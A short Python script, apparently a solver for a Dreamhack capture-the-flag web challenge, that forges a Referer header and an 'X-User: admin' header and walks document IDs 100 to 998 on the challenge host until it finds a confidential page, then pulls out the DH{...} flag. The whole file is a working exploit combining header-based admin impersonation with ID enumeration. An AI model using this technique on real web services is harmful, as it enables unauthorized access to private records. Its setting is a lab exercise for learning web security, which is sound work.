import requests
import tqdm
import re

header = {
    'Referer':'http://host8.dreamhack.games:13369/share',
    'X-User':'admin'
}
for _ in tqdm.tqdm(range(100,999)):
    host = "http://host8.dreamhack.games:13369/doc/"
    host += str(_)

    req = requests.get(host,headers=header)
    if 'This is a confidential internal document.' in req.text:
        print('found : {0}'.format(_))
        match = re.search(r'DH\{.*?\}', req.text)
        print(match.group())
        break